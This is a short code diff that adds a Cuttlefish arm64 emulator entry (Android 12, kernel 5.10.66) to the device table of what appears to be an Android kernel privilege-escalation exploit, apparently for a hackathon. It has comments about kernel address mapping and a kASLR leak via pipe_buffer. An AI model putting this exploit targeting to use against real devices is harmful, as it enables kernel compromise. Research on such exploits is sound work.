@@ -162,6 +162,26 @@ static struct device_config {
         // determines how to get kASLR leak after leaking `pipe_buffer`
         //.find_kbase = noop_kbase,
         .find_kbase = offset_kbase,
+    },
+    // for second ingots hackathon
+    {
+        // Device name, model, and security patch version can be gotten with `getprop` command in adb shell
+        // See exploit.c `find_dev_config()` to see which properties are checked
+        // TODO: see if name needs to be set to anything specific or if its just used for user information
+        .name = "Cuttlefish arm64 phone",
+        .model = "Cuttlefish arm64 phone",
+        .android_version = 12,
+        // I don't know exactly why these happen to be old
+        // cuttlefish version I downloaded is latest
+        .android_security_patch.year = 2022,
+        .android_security_patch.month = 3,
+        .kernel_version = KERNEL_VERSION(5, 10, 66),
+        // I think this essentially takes an offset in kernel and maps it to virtual (linear) addres?
+        // Im not to sure though
+        .kimg_to_lm = cuttlefish_kimg_to_lm,
+        // determines how to get kASLR leak after leaking `pipe_buffer`
+        //.find_kbase = noop_kbase,
+        .find_kbase = offset_kbase,
     }
 };
 
